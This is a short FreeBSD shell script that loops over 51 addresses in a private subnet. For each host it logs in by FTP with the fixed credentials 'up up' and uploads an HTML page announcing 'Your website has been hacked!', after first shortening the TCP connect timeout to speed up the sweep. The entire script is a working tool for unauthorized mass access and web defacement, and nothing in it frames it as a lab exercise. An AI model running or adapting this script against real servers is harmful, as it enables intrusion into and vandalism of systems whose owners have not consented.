#!/bin/sh
# Tested in FreeBSD

sudo sysctl net.inet.tcp.keepinit=1000

for i in `jot 51 1`
do
echo "Your website has been hacked!<br>192.168.53.$i<br>`date +%H:%M:%S`" > `date  +%H%M%S`.htm
ftp -a 192.168.53.$i << EOF
user up up
put *.htm
quit
EOF
rm *.htm
done

sudo sysctl net.inet.tcp.keepinit=75000
